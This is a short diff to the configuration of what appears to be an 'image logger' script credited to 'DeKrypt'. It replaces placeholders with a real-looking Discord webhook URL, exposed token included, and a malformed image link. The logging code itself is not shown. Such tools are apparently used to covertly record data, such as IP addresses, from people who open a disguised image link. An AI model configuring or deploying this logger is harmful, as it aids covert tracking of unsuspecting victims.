@@ -10,8 +10,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1224345941704966184/sIg-PosOjnv83Ex7oKMG1IDAvsc-JNuuGs55IMjhq_A3HblZIvKFAVqpqVNSqf46N51e",
+    "image": "https://https://i.pinimg.com/736x/68/dd/6a/68dd6ab90746081c3adee1bb7163551c.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
